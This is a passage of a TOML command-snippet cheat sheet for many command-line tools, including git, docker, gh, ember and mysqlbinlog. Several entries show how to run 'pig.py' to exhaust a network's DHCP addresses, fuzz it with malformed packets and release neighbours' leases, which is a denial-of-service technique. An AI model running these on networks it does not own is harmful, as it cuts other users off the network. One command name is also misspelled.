  command = "updog --ssl"
  output = ""

[[snippets]]
  description = "List releases in a GitHub repository, limited to 30 items"
  command = "gh release list"
  output = ""

[[snippets]]
  description = "Display information about a specific release"
  command = "gh release view <tag>"
  output = ""

[[snippets]]
  description = "Create a new release"
  command = "gh release create <tag>"
  output = ""

[[snippets]]
  description = "Delete a specific release"
  command = "gh release delete <tag>"
  output = ""

[[snippets]]
  description = "Download assets from a specific release"
  command = "gh release download <tag>"
  output = ""

[[snippets]]
  description = "Upload assets to a specific release"
  command = "gh release upload <tag> <path/to/file1 path/to/file2 ...>"
  output = ""

[[snippets]]
  description = "Show deleted files"
  command = "git ls-files --deleted"
  output = ""

[[snippets]]
  description = "Show modified and deleted files"
  command = "git ls-files --modified"
  output = ""

[[snippets]]
  description = "Show ignored and untracked files"
  command = "git ls-files --others"
  output = ""

[[snippets]]
  description = "Show untracked files, not ignored"
  command = "git ls-files --others --exclude-standard"
  output = ""

[[snippets]]
  description = "List local Docker images"
  command = "docker image ls"
  output = ""

[[snippets]]
  description = "Delete unused local Docker images"
  command = "docker image prune"
  output = ""

[[snippets]]
  description = "Delete all unused images (not just those without a tag)"
  command = "docker image prune --all"
  output = ""

[[snippets]]
  description = "Show the history of a local Docker image"
  command = "docker image history <image>"
  output = ""

[[snippets]]
  description = "Create stabilization file to be able to remove camera shakes"
  command = "transcode -J stabilize -i <input_file>"
  output = ""

[[snippets]]
  description = "Remove camera shakes after creating stabilization file, transform video using XviD"
  command = "transcode -J transform -i <input_file> -y xvid -o <output_file>"
  output = ""

[[snippets]]
  description = "Resize the video to 640x480 pixels and convert to MPEG4 codec using XviD"
  command = "transcode -Z 640x480 -i <input_file> -y xvid -o <output_file>"
  output = ""

[[snippets]]
  description = "Create the GitHub pages branch inside the repository in the current directory"
  command = "git gh-pages"
  output = ""

[[snippets]]
  description = "List the events on your account"
  command = "linode-cli events list"
  output = ""

[[snippets]]
  description = "View details about a specific event"
  command = "linode-cli events view <event_id>"
  output = ""

[[snippets]]
  description = "Mark an event as read"
  command = "linode-cli events mark-read <event_id>"
  output = ""

[[snippets]]
  description = "Start the GUI or bring it to front"
  command = "clementine"
  output = ""

[[snippets]]
  description = "Start playing music"
  command = "clementine <url|path/to/music.ext>"
  output = ""

[[snippets]]
  description = "Toggle between pausing and playing"
  command = "clementine --play-pause"
  output = ""

[[snippets]]
  description = "Stop playback"
  command = "clementine --stop"
  output = ""

[[snippets]]
  description = "Skip to the next or previous track"
  command = "clementine --<next|previous>"
  output = ""

[[snippets]]
  description = "Create a new playlist with one or more music files or URLs"
  command = "clementine --create <url1 url2 ... | path/to/music1.ext path/to/music2.ext ...>"
  output = ""

[[snippets]]
  description = "Load a playlist file"
  command = "clementine --load <path/to/playlist.ext>"
  output = ""

[[snippets]]
  description = "Play a specific track in the currently loaded playlist"
  command = "clementine --play-track <5>"
  output = ""

[[snippets]]
  description = "Log in with an interactive prompt"
  command = "mozillavpn login"
  output = ""

[[snippets]]
  description = "Connect to Mozilla VPN"
  command = "mozillavpn activate"
  output = ""

[[snippets]]
  description = "Display the connection status"
  command = "mozillavpn status"
  output = ""

[[snippets]]
  description = "List available servers"
  command = "mozillavpn servers"
  output = ""

[[snippets]]
  description = "Select a specific server"
  command = "mozillavpn select <server_name>"
  output = ""

[[snippets]]
  description = "Disconnect from Mozilla VPN"
  command = "mozillavpn deactivate"
  output = ""

[[snippets]]
  description = "Log out"
  command = "mozillavpn logout"
  output = ""

[[snippets]]
  description = "Display help for a subcommand"
  command = "mozillavpn <subcommand> --help"
  output = ""

[[snippets]]
  description = "Render a `png` image with a filename based on the input filename and output format (uppercase -O)"
  command = "neato -T <png> -O <path/to/input.gv>"
  output = ""

[[snippets]]
  description = "Render a `svg` image with the specified output filename (lowercase -o)"
  command = "neato -T <svg> -o <path/to/image.svg> <path/to/input.gv>"
  output = ""

[[snippets]]
  description = "Render the output in `ps`, `pdf`, `svg`, `fig`, `png`, `gif`, `jpg`, `json`, or `dot` format"
  command = "neato -T <format> -O <path/to/input.gv>"
  output = ""

[[snippets]]
  description = "Render a `gif` image using `stdin` and `stdout`"
  command = "echo ""<graph {this -- that} >"" | neato -T <gif> > <path/to/image.gif>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "neato -?"
  output = ""

[[snippets]]
  description = "Set a read-only variable"
  command = "readonly <variable_name>=<value>"
  output = ""

[[snippets]]
  description = "Mark a variable as read-only"
  command = "readonly <existing_variable>"
  output = ""

[[snippets]]
  description = "[p]rint the names and values of all read-only variables to `stdout`"
  command = "readonly -p"
  output = ""

[[snippets]]
  description = "Sign 'unsigned.layout' with two keys and write it to 'root.layout'"
  command = "in-toto-sign -f <unsigned.layout> -k <priv_key1> <priv_key2> -o <root.layout>"
  output = ""

[[snippets]]
  description = "Replace signature in link file and write to default filename"
  command = "in-toto-sign -f <package.2f89b927.link> -k <priv_key>"
  output = ""

[[snippets]]
  description = "Verify a layout signed with 3 keys"
  command = "in-toto-sign -f <root.layout> -k <pub_key0> <pub_key1> <pub_key2> --verify"
  output = ""

[[snippets]]
  description = "Sign a layout with the default GPG key in default GPG keyring"
  command = "in-toto-sign -f <root.layout> --gpg"
  output = ""

[[snippets]]
  description = "Verify a layout with a GPG key identified by keyid '...439F3C2'"
  command = "in-toto-sign -f <root.layout> --verify --gpg <...439F3C2>"
  output = ""

[[snippets]]
  description = "Install one or more packages"
  command = "omf install <name>"
  output = ""

[[snippets]]
  description = "List installed packages"
  command = "omf list"
  output = ""

[[snippets]]
  description = "List available themes"
  command = "omf theme"
  output = ""

[[snippets]]
  description = "Apply a theme"
  command = "omf theme <name>"
  output = ""

[[snippets]]
  description = "Remove a theme or package"
  command = "omf remove <name>"
  output = ""

[[snippets]]
  description = "Uninstall Oh My Fish"
  command = "omf destroy"
  output = ""

[[snippets]]
  description = "Convert a PBM image to a MACP file"
  command = "pbmtomacp <path/to/image.pbm> > <path/to/output.macp>"
  output = ""

[[snippets]]
  description = "Do not compress the output file"
  command = "pbmtomacp -norle <path/to/image.pbm> > <path/to/output.macp>"
  output = ""

[[snippets]]
  description = "Yank using the default delimiters (\f, \n, \r, \s, \t)"
  command = "<sudo dmesg> | yank"
  output = ""

[[snippets]]
  description = "Yank an entire line"
  command = "<sudo dmesg> | yank -l"
  output = ""

[[snippets]]
  description = "Yank using a specific delimiter"
  command = "<echo hello=world> | yank -d <=>"
  output = ""

[[snippets]]
  description = "Only yank fields matching a specific pattern"
  command = "<ps ux> | yank -g ""<[0-9]+>"""
  output = ""

[[snippets]]
  description = "Print a text message. Note: quotes are optional"
  command = "echo ""<Hello World>"""
  output = ""

[[snippets]]
  description = "Print a message with environment variables"
  command = "echo ""<My path is $PATH>"""
  output = ""

[[snippets]]
  description = "Print a message without the trailing newline"
  command = "echo -n ""<Hello World>"""
  output = ""

[[snippets]]
  description = "Append a message to the file"
  command = "echo ""<Hello World>"" >> <file.txt>"
  output = ""

[[snippets]]
  description = "Enable interpretation of backslash escapes (special characters)"
  command = "echo -e ""<Column 1\tColumn 2>"""
  output = ""

[[snippets]]
  description = "Print the exit status of the last executed command (Note: In Windows Command Prompt and PowerShell the equivalent commands are `echo %errorlevel%` and `$lastexitcode` respectively)"
  command = "echo $?"
  output = ""

[[snippets]]
  description = "Install a specific PHP extension"
  command = "pickle install <extension_name>"
  output = ""

[[snippets]]
  description = "Convert an existing PECL extension configuration to a Pickle configuration file"
  command = "pickle convert <path/to/directory>"
  output = ""

[[snippets]]
  description = "Validate a PECL extension"
  command = "pickle validate <path/to/directory>"
  output = ""

[[snippets]]
  description = "Package a PECL extension for release"
  command = "pickle release <path/to/directory>"
  output = ""

[[snippets]]
  description = "Open moe and create a backup file (file~) when saving edits"
  command = "moe <path/to/file>"
  output = ""

[[snippets]]
  description = "Open a file as read-only"
  command = "moe --read-only <path/to/file>"
  output = ""

[[snippets]]
  description = "Edit a file without creating backups"
  command = "moe --no-backup <path/to/file>"
  output = ""

[[snippets]]
  description = "Edit a file ignoring case in searches"
  command = "moe --ignore-case <path/to/file>"
  output = ""

[[snippets]]
  description = "Save and Quit"
  command = "<Ctrl> + X"
  output = ""

[[snippets]]
  description = "Create a new Ember application"
  command = "ember new <my_new_app>"
  output = ""

[[snippets]]
  description = "Create a new Ember addon"
  command = "ember addon <my_new_addon>"
  output = ""

[[snippets]]
  description = "Build the project"
  command = "ember build"
  output = ""

[[snippets]]
  description = "Build the project in production mode"
  command = "ember build -prod"
  output = ""

[[snippets]]
  description = "Run the development server"
  command = "ember serve"
  output = ""

[[snippets]]
  description = "Run the test suite"
  command = "ember test"
  output = ""

[[snippets]]
  description = "Run a blueprint to generate something like a route or component"
  command = "ember generate <type> <name>"
  output = ""

[[snippets]]
  description = "Install an ember-cli addon"
  command = "ember install <name_of_addon>"
  output = ""

[[snippets]]
  description = "Exhaust all of the available DHCP addresses using the specified interface"
  command = "sudo ./pig.py <eth0>"
  output = ""

[[snippets]]
  description = "Exhaust IPv6 addresses using eth1 interface"
  command = "sudo ./pig.py -6 <eth1>"
  output = ""

[[snippets]]
  description = "Send fuzzed/malformed data packets using the interface"
  command = "sudo ./pig.py --fuzz <eth1>"
  output = ""

[[snippets]]
  description = "Enable color output"
  command = "sudo ./pig.py -c <eth1>"
  output = ""

[[snippets]]
  description = "Enable minimal verbosity and color output"
  command = "sudo ./pig.py -c --verbosity=1 <eth1>"
  output = ""

[[snippets]]
  description = "Use a debug verbosity of 100 and scan network of neighboring devices using ARP packets"
  command = "sudo ./pig.py -c --verbosity=100 --neighbors-scan-arp <eth1>"
  output = ""

[[snippets]]
  description = "Enable printing lease information, attempt to scan and release all neighbor IP addresses"
  command = "sudo ./pig.py --neighbors-scan-arp -r --show-options <eth1>"
  output = ""

[[snippets]]
  description = "Show events from a specific binary log file"
  command = "mysqlbinlog <path/to/binlog>"
  output = ""

[[snippets]]
  description = "Show entries from a binary log for a specific database"
  command = "mysqlbinlog --database <database_name> <path/to/binlog>"
  output = ""

[[snippets]]
  description = "Show events from a binary log between specific dates"
  command = "mysqlbinlog --start-datetime='<2022-01-01 01:00:00>' --stop-datetime='<2022-02-01 01:00:00>' <path/to/binlog>"
  output = ""

[[snippets]]
  description = "Show events from a binary log between specific positions"
  command = "mysqlbinlog --start-position=<100> --stop-position=<200> <path/to/binlog>"
  output = ""

[[snippets]]
  description = "Show binary log from a MySQL server on the given host"
  command = "mysqlbinlog --host=<hostname> <path/to/binlog>"
  output = ""

[[snippets]]
  description = "Rebase the current branch on top of another using a merge commit and only one conflict handling"
  command = "git psykorebase <upstream_branch>"
  output = ""

[[snippets]]
  description = "Continue after conflicts have been handled"
  command = "git psykorebase --continue"
  output = ""

[[snippets]]
  description = "Specify the branch to rebase"
  command = "git psykorebase <upstream_branch> <target_branch>"
  output = ""

[[snippets]]
  description = "Format a file and print the result to `stdout`"
  command = "clang-format <path/to/file>"
  output = ""

[[snippets]]
  description = "Format a file in-place"
  command = "clang-format -i <path/to/file>"
  output = ""

[[snippets]]
  description = "Format a file using a predefined coding style"
  command = "clang-format --style=<LLVM|GNU|Google|Chromium|Microsoft|Mozilla|WebKit> <path/to/file>"
  output = ""

[[snippets]]
  description = "Format a file using the `.clang-format` file in one of the parent directories of the source file"
  command = "clang-format --style=file <path/to/file>"
  output = ""

[[snippets]]
  description = "Generate a custom `.clang-format` file"
  command = "clang-format --style=<LLVM|GNU|Google|Chromium|Microsoft|Mozilla|WebKit> --dump-config > <.clang-format>"
  output = ""

[[snippets]]
  description = "Repair a `pcap`/`pcapng` file (Note: for `pcap` files, only the first 262144 bytes of each packet are scanned)"
  command = "pcapfix <path/to/file.pcapng>"
  output = ""

[[snippets]]
  description = "Repair an entire `pcap` file"
  command = "pcapfix --deep-scan <path/to/file.pcap>"
  output = ""

[[snippets]]
  description = "Repair a `pcap`/`pcapng` file and write the repaired file to the specified location"
  command = "pcapfix --outfile <path/to/repaired.pcap> <path/to/file.pcap>"
  output = ""

[[snippets]]
  description = "Repair a `pcapng` file and treat it as a `pcapng` file, ignoring the automatic recognition"
  command = "pcapfix --pcapng <path/to/file.pcapng>"
  output = ""

[[snippets]]
  description = "Repair a file and show the process in detail"
  command = "pcapfix --verbose <path/to/file.pcap>"
  output = ""

[[snippets]]
  description = "Create a new timesheet"
  command = "timetrap sheet <timesheet>"
  output = ""

[[snippets]]
  description = "Check in an entry started 5 minutes ago"
  command = "timetrap in --at ""<5 minutes ago>"" <entry_notes>"
  output = ""

[[snippets]]
  description = "Display the current timesheet"
  command = "timetrap display"
  output = ""

[[snippets]]
  description = "Edit the last entry's end time"
  command = "timetrap edit --end <time>"
  output = ""

[[snippets]]
  description = "Probe a list of domains from a text file"
  command = "cat <input_file> | httprobe"
  output = ""

[[snippets]]
  description = "Only check for HTTP if HTTPS is not working"
  command = "cat <input_file> | httprobe --prefer-https"
  output = ""

[[snippets]]
  description = "Probe additional ports with a given protocol"
  command = "cat <input_file> | httprobe -p <https:2222>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "httprobe --help"
  output = ""

[[snippets]]
  description = "Start the server that communicates with connected devices"
  command = "react-native start"
  output = ""

[[snippets]]
  description = "Start the metro bundler with a clean cache"
  command = "react-native start --reset-cache"
  output = ""

[[snippets]]
  description = "Start the server in a custom port (defaults to 8081)"
  command = "react-native start --port <3000>"
  output = ""

[[snippets]]
  description = "Start the server in verbose mode"
  command = "react-native start --verbose"
  output = ""

[[snippets]]
  description = "Specify the maximum number of workers for transforming files (default is the number of CPU cores)"
  command = "react-native start --max-workers <count>"
  output = ""

[[snippets]]
  description = "Disable interactive mode"
  command = "react-native start --no-interactive"
  output = ""

[[snippets]]
  description = "Print the remove commands instead of actually removing anything"
  command = "go clean -n"
  output = ""

[[snippets]]
  description = "Delete the build cache"
  command = "go clean -cache"
  output = ""

[[snippets]]
  description = "Delete all cached test results"
  command = "go clean -testcache"
  output = ""

[[snippets]]
  description = "Delete the module cache"
  command = "go clean -modcache"
  output = ""

[[snippets]]
  description = "Send a message to a given user on a given terminal id"
  command = "write <username> <terminal_id>"
  output = ""

[[snippets]]
  description = "Send message to "testuser" on terminal `/dev/tty/5`"
  command = "write <testuser> <tty/5>"
  output = ""

[[snippets]]
  description = "Send message to "johndoe" on pseudo terminal `/dev/pts/5`"
  command = "write <johndoe> <pts/5>"
  output = ""

[[snippets]]
  description = "Display a list of available rulesets and formats"
  command = "phpmd"
  output = ""

[[snippets]]
  description = "Scan a file or directory for problems using comma-separated rulesets"
  command = "phpmd <path/to/file_or_directory> <xml|text|html> <ruleset1,ruleset2,...>"
  output = ""

[[snippets]]
  description = "Specify the minimum priority threshold for rules"
  command = "phpmd <path/to/file_or_directory> <xml|text|html> <ruleset1,ruleset2,...> --minimumpriority <priority>"
  output = ""

[[snippets]]
  description = "Include only the specified extensions in analysis"
  command = "phpmd <path/to/file_or_directory> <xml|text|html> <ruleset1,ruleset2,...> --suffixes <extensions>"
  output = ""

[[snippets]]
  description = "Exclude the specified comma-separated directories"
  command = "phpmd <path/to/file_or_directory1,path/to/file_or_directory2,...> <xml|text|html> <ruleset1,ruleset2,...> --exclude <directory_patterns>"
  output = ""

[[snippets]]
  description = "Output the results to a file instead of `stdout`"
  command = "phpmd <path/to/file_or_directory> <xml|text|html> <ruleset1,ruleset2,...> --reportfile <path/to/report_file>"
  output = ""

[[snippets]]
  description = "Ignore the use of warning-suppressive PHPDoc comments"
  command = "phpmd <path/to/file_or_directory> <xml|text|html> <ruleset1,ruleset2,...> --strict"
  output = ""

[[snippets]]
  description = "Monitor Clockwork logs for the current project"
  command = "clockwork-cli"
  output = ""

[[snippets]]
  description = "Monitor Clockwork logs for a specific project"
  command = "clockwork-cli <path/to/directory>"
  output = ""

[[snippets]]
  description = "Monitor Clockwork logs for multiple projects"
  command = "clockwork-cli <path/to/directory1 path/to/directory2 ...>"
  output = ""

[[snippets]]
  description = "Create local alias for director in a specific [e]nvironment"
  command = "bosh alias-env <environment_name> -e <ip_address|URL> --ca-cert <ca_certificate>"
  output = ""

[[snippets]]
  description = "List environments"
  command = "bosh environments"
  output = ""

[[snippets]]
  description = "Log in to the director"
  command = "bosh login -e <environment>"
  output = ""

[[snippets]]
  description = "List deployments"
  command = "bosh -e <environment> deployments"
  output = ""

[[snippets]]
  description = "List environment virtual machines in a [d]eployment"
  command = "bosh -e <environment> vms -d <deployment>"
  output = ""

[[snippets]]
  description = "SSH into virtual machine"
  command = "bosh -e <environment> ssh <virtual_machine> -d <deployment>"
  output = ""

[[snippets]]
  description = "Upload stemcell"
  command = "bosh -e <environment> upload-stemcell <stemcell_file|url>"
  output = ""

[[snippets]]
  description = "Show current cloud config"
  command = "bosh -e <environment> cloud-config"
  output = ""

[[snippets]]
  description = "Change an author's email and name across the whole Git repository"
  command = "git reauthor --old-email <old@example.com> --correct-email <new@example.com> --correct-name ""<name>"""
  output = ""

[[snippets]]
  description = "Change the email and name to the ones defined in the Git config"
  command = "git reauthor --old-email <old@example.com> --use-config"
  output = ""

[[snippets]]
  description = "Change the email and name of all commits, regardless of their original author"
  command = "git reauthor --all --correct-email <name@example.com> --correct-name <name>"
  output = ""

[[snippets]]
  description = "Display the `AndroidManifest.xml` of the base module"
  command = "bundletool dump manifest --bundle=<path/to/bundle.aab>"
  output = ""

[[snippets]]
  description = "Display a specific value from the `AndroidManifest.xml` using XPath"
  command = "bundletool dump manifest --bundle=<path/to/bundle.aab> --xpath=</manifest/@android:versionCode>"
  output = ""

[[snippets]]
  description = "Display the `AndroidManifest.xml` of a specific module"
  command = "bundletool dump manifest --bundle=<path/to/bundle.aab> --module=<name>"
  output = ""

[[snippets]]
  description = "Display all the resources in the application bundle"
  command = "bundletool dump resources --bundle=<path/to/bundle.aab>"
  output = ""

[[snippets]]
  description = "Display the configuration for a specific resource"
  command = "bundletool dump resources --bundle=<path/to/bundle.aab> --resource=<type/name>"
  output = ""

[[snippets]]
  description = "Display the configuration and values for a specific resource using the ID"
  command = "bundletool dump resources --bundle=<path/to/bundle.aab> --resource=<0x7f0e013a> --values"
  output = ""

[[snippets]]
  description = "Display the contents of the bundle configuration file"
  command = "bundletool dump config --bundle=<path/to/bundle.aab>"
  output = ""

[[snippets]]
  description = "Create a Cordova project"
  command = "cordova create <path/to/directory> <package> <project_name>"
  output = ""

[[snippets]]
  description = "Display the current workspace status"
  command = "cordova info"
  output = ""

[[snippets]]
  description = "Add a Cordova platform"
  command = "cordova platform add <platform>"
  output = ""

[[snippets]]
  description = "Remove a Cordova platform"
  command = "cordova platform remove <platform>"
  output = ""

[[snippets]]
  description = "Add a Cordova plugin"
  command = "cordova plugin add <pluginid>"
  output = ""

[[snippets]]
  description = "Remove a Cordova plugin"
  command = "cordova plugin remove <pluginid>"
  output = ""

[[snippets]]
  description = "Run a Python web app"
  command = "waitress-serve <import.path:wsgi_func>"
  output = ""

[[snippets]]
  description = "Listen on port 8080 on localhost"
  command = "waitress-serve --listen=<localhost>:<8080> <import.path:wsgi_func>"
  output = ""

[[snippets]]
  description = "Start waitress on a Unix socket"
  command = "waitress-serve --unix-socket=<path/to/socket> <import.path:wsgi_func>"
  output = ""

[[snippets]]
  description = "Use 4 threads to process requests"
  command = "waitress-serve --threads=<4> <import.path:wsgifunc>"
  output = ""

[[snippets]]
  description = "Call a factory method that returns a WSGI object"
  command = "waitress-serve --call <import.path.wsgi_factory>"
  output = ""

[[snippets]]
  description = "Use the HTTPS URL scheme"
  command = "waitress-serve --url-scheme=<https> <import.path:wsgi_func>"
  output = ""

[[snippets]]
  description = "Convert a HP ThinkJet printer commands file to a PBM file"
  command = "thinkjettopbm <path/to/input> > <path/to/output.pbm>"
  output = ""

[[snippets]]
  description = "Print debug information to `stderr`"
  command = "thinkjettopbm -d <path/to/input> > <path/to/output.pbm>"
  output = ""

[[snippets]]
  description = "List e-books in the library with additional information"
  command = "calibredb list"
  output = ""

[[snippets]]
  description = "Search for e-books displaying additional information"
  command = "calibredb list --search <search_term>"
  output = ""

[[snippets]]
  description = "Search for just ids of e-books"
  command = "calibredb search <search_term>"
  output = ""

[[snippets]]
  description = "Add one or more e-books to the library"
  command = "calibredb add <file1 file2 …>"
  output = ""

[[snippets]]
  description = "[r]ecursively add all e-books under a directory to the library"
  command = "calibredb add -r <path/to/directory>"
  output = ""

[[snippets]]
  description = "Remove one or more e-books from the library. You need the e-book IDs (see above)"
  command = "calibredb remove <id1 id2 …>"
  output = ""

[[snippets]]
  description = "Create an empty local branch"
  command = "git fresh-branch <branch_name>"
  output = ""

[[snippets]]
  description = "Run a command on two hosts, and print its output on each server inline"
  command = "pssh -i -H ""<host1> <host2>"" <hostname -i>"
  output = ""

[[snippets]]
  description = "Run a command and save the output to separate files"
  command = "pssh -H <host1> -H <host2> -o <path/to/output_dir> <hostname -i>"
  output = ""

[[snippets]]
  description = "Run a command on multiple hosts, specified in a new-line separated file"
  command = "pssh -i -h <path/to/hosts_file> <hostname -i>"
  output = ""

[[snippets]]
  description = "Run a command as root (this asks for the root password)"
  command = "pssh -i -h <path/to/hosts_file> -A -l <root_username> <hostname -i>"
  output = ""

[[snippets]]
  description = "Run a command with extra SSH arguments"
  command = "pssh -i -h <path/to/hosts_file> -x ""<-O VisualHostKey=yes>"" <hostname -i>"
  output = ""

[[snippets]]
  description = "Run a command limiting the number of parallel connections to 10"
  command = "pssh -i -h <path/to/hosts_file> -p <10> '<cd dir; ./script.sh; exit>'"
  output = ""

[[snippets]]
  description = "Enlarge the specified image by the specified factor"
  command = "pamenlarge -scale <N> <path/to/image.pam> > <path/to/output.pam>"
  output = ""

[[snippets]]
  description = "Enlarge the specified image by the specified factors horizontally and vertically"
  command = "pamenlarge -xscale <XN> -yscale <YN> <path/to/image.pam> > <path/to/output.pam>"
  output = ""

[[snippets]]
  description = "List dependencies with funding URL for the project in the current directory"
  command = "npm fund"
  output = ""

[[snippets]]
  description = "Open the funding URL for a specific package in the default web browser"
  command = "npm fund <package>"
  output = ""

[[snippets]]
  description = "List dependencies with a funding URL for a specific [w]orkspace for the project in the current directory"
  command = "npm fund -w <workspace>"
  output = ""

[[snippets]]
  description = "Log in or create an account for the Particle CLI"
  command = "particle setup"
  output = ""

[[snippets]]
  description = "Display a list of devices"
  command = "particle list"
  output = ""

[[snippets]]
  description = "Create a new Particle project interactively"
  command = "particle project create"
  output = ""

[[snippets]]
  description = "Compile a Particle project"
  command = "particle compile <device_type> <path/to/source_code.ino>"
  output = ""

[[snippets]]
  description = "Update a device to use a specific app remotely"
  command = "particle flash <device_name> <path/to/program.bin>"
  output = ""

[[snippets]]
  description = "Update a device to use the latest firmware via serial"
  command = "particle flash --serial <path/to/firmware.bin>"
  output = ""

[[snippets]]
  description = "Execute a function on a device"
  command = "particle call <device_name> <function_name> <function_arguments>"
  output = ""

[[snippets]]
  description = "Make WirePlumber start with the user session immediately (for systemd systems)"
  command = "systemctl --user --now enable wireplumber"
  output = ""

[[snippets]]
  description = "Run WirePlumber, after `pipewire` is started (for non-systemd systems)"
  command = "wireplumber"
  output = ""

[[snippets]]
  description = "Specify a different context configuration file"
  command = "wireplumber --config-file <path/to/file>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "wireplumber --help"
  output = ""

[[snippets]]
  description = "Display version"
  command = "wirepumbler --version"
  output = ""

[[snippets]]
  description = "Show all stats for all columns"
  command = "csvstat <data.csv>"
  output = ""

[[snippets]]
  description = "Show all stats for columns 2 and 4"
  command = "csvstat -c <2,4> <data.csv>"
  output = ""

[[snippets]]
  description = "Show sums for all columns"
  command = "csvstat --sum <data.csv>"
  output = ""

[[snippets]]
  description = "Show the max value length for column 3"
  command = "csvstat -c <3> --len <data.csv>"
  output = ""

[[snippets]]
  description = "Show the number of unique values in the "name" column"
  command = "csvstat -c <name> --unique <data.csv>"
  output = ""

[[snippets]]
  description = "Initialize a new local repository"
  command = "git init"
  output = ""

[[snippets]]
  description = "Initialize a repository with the specified name for the initial branch"
  command = "git init --initial-branch=<branch_name>"
  output = ""

[[snippets]]
  description = "Initialize a repository using SHA256 for object hashes (requires Git version 2.29+)"
  command = "git init --object-format=<sha256>"
  output = ""

[[snippets]]
  description = "Initialize a barebones repository, suitable for use as a remote over ssh"
  command = "git init --bare"
  output = ""

[[snippets]]
  description = "Save all records (in a separate file) up to the last intact one"
  command = "sc_wartsfix <path/to/file1.warts path/to/file2.warts ...>"
  output = ""

[[snippets]]
  description = "Start `mitmproxy` with default settings"
  command = "mitmproxy"
  output = ""

[[snippets]]
  description = "Start `mitmproxy` bound to a custom address and port"
  command = "mitmproxy --listen-host <ip_address> --listen-port <port>"
  output = ""

[[snippets]]
  description = "Start `mitmproxy` using a script to process traffic"
  command = "mitmproxy --scripts <path/to/script.py>"
  output = ""

[[snippets]]
  description = "Export the logs with SSL/TLS master keys to external programs (wireshark, etc.)"
  command = "SSLKEYLOGFILE=""<path/to/file>"" mitmproxy"
  output = ""

[[snippets]]
  description = "Convert an input image to PBM, PGM, or PPM format irrespective of the input type"
  command = "anytopnm <path/to/input> > <path/to/output.pnm>"
  output = ""

[[snippets]]
  description = "Display version"
  command = "anytopnm -version"
  output = ""

[[snippets]]
  description = "Display the absolute path for a file or directory"
  command = "realpath <path/to/file_or_directory>"
  output = ""

[[snippets]]
  description = "Require all path components to exist"
  command = "realpath --canonicalize-existing <path/to/file_or_directory>"
  output = ""

[[snippets]]
  description = "Resolve ".." components before symlinks"
  command = "realpath --logical <path/to/file_or_directory>"
  output = ""

[[snippets]]
  description = "Disable symlink expansion"
  command = "realpath --no-symlinks <path/to/file_or_directory>"
  output = ""

[[snippets]]
  description = "Suppress error messages"
  command = "realpath --quiet <path/to/file_or_directory>"
  output = ""

[[snippets]]
  description = "Interactively create a new modpack in the current directory"
  command = "packwiz init"
  output = ""

[[snippets]]
  description = "Add a mod from Modrinth or Curseforge"
  command = "packwiz <modrinth|curseforge> add <url|slug|search_term>"
  output = ""

[[snippets]]
  description = "List all mods in the modpack"
  command = "packwiz list"
  output = ""

[[snippets]]
  description = "Update `index.toml` after manually editing files"
  command = "packwiz refresh"
  output = ""

[[snippets]]
  description = "Export as a Modrinth (`.mrpack`) or Curseforge (`.zip`) file"
  command = "packwiz <modrinth|curseforge> export"
  output = ""

[[snippets]]
  description = "Convert a PBM image into a PTX file"
  command = "pbmtoptx <path/to/image.pbm> > <path/to/output.ptx>"
  output = ""

[[snippets]]
  description = "Edit the output of `command1` before piping it into `command2`"
  command = "<command1> | vipe | <command2>"
  output = ""

[[snippets]]
  description = "Buffer the output of `command1` in a temporary file with the specified file extension in order to aid syntax highlighting"
  command = "<command1> | vipe --suffix <json> | <command2>"
  output = ""

[[snippets]]
  description = "Use the specified text editor"
  command = "<command1> | EDITOR=<vim> vipe | <command2>"
  output = ""

[[snippets]]
  description = "Convert a GIF image to a Netpbm image pixel-for-pixel"
  command = "giftopnm <path/to/input.gif> > <path/to/output.pnm>"
  output = ""

[[snippets]]
  description = "Display version"
  command = "giftopnm -version"
  output = ""

[[snippets]]
  description = "Change the owner group of a file/directory"
  command = "chgrp <group> <path/to/file_or_directory>"
  output = ""

[[snippets]]
  description = "Recursively change the owner group of a directory and its contents"
  command = "chgrp -R <group> <path/to/directory>"
  output = ""

[[snippets]]
  description = "Change the owner group of a symbolic link"
  command = "chgrp -h <group> <path/to/symlink>"
  output = ""

[[snippets]]
  description = "Change the owner group of a file/directory to match a reference file"
  command = "chgrp --reference=<path/to/reference_file> <path/to/file_or_directory>"
  output = ""

[[snippets]]
  description = "List all sinks (or other types - sinks are outputs and sink-inputs are active audio streams)"
  command = "pactl list <sinks> short"
  output = ""

[[snippets]]
  description = "Change the default sink (output) to 1 (the number can be retrieved via the `list` subcommand)"
  command = "pactl set-default-sink <1>"
  output = ""

[[snippets]]
  description = "Move sink-input 627 to sink 1"
  command = "pactl move-sink-input <627> <1>"
  output = ""

[[snippets]]
  description = "Set the volume of sink 1 to 75%"
  command = "pactl set-sink-volume <1> <0.75>"
  output = ""

[[snippets]]
  description = "Toggle mute on the default sink (using the special name `@DEFAULT_SINK@`)"
  command = "pactl set-sink-mute <@DEFAULT_SINK@> toggle"
  output = ""

[[snippets]]
  description = "Sign into a Fly account"
  command = "flyctl auth login"
  output = ""

[[snippets]]
  description = "Launch an application from a specific Dockerfile (the default path is the current working directory)"
  command = "flyctl launch --dockerfile <path/to/dockerfile>"
  output = ""

[[snippets]]
  description = "Open the current deployed application in the default web browser"
  command = "flyctl open"
  output = ""

[[snippets]]
  description = "Deploy the Fly applications from a specific Dockerfile"
  command = "flyctl deploy --dockerfile <path/to/dockerfile>"
  output = ""

[[snippets]]
  description = "Open the Fly Web UI for the current application in a web browser"
  command = "flyctl dashboard"
  output = ""

[[snippets]]
  description = "List all applications in the logged-in Fly account"
  command = "flyctl apps list"
  output = ""

[[snippets]]
  description = "View the status of a specific running application"
  command = "flyctl status --app <app_name>"
  output = ""

[[snippets]]
  description = "Display version information"
  command = "flyctl version"
  output = ""

[[snippets]]
  description = "[l]ist the available jobs"
  command = "act -l"
  output = ""

[[snippets]]
  description = "Run the default event"
  command = "act"
  output = ""

[[snippets]]
  description = "Run a specific event"
  command = "act <event_type>"
  output = ""

[[snippets]]
  description = "Run a specific [j]ob"
  command = "act -j <job_id>"
  output = ""

[[snippets]]
  description = "Do [n]ot actually run the actions (i.e. a dry run)"
  command = "act -n"
  output = ""

[[snippets]]
  description = "Show [v]erbose logs"
  command = "act -v"
  output = ""

[[snippets]]
  description = "Run a specific [W]orkflow with the push event"
  command = "act push -W <path/to/workflow>"
  output = ""

[[snippets]]
  description = "Execute all benchmarks of a package"
  command = "cargo bench"
  output = ""

[[snippets]]
  description = "Don't stop when a benchmark fails"
  command = "cargo bench --no-fail-fast"
  output = ""

[[snippets]]
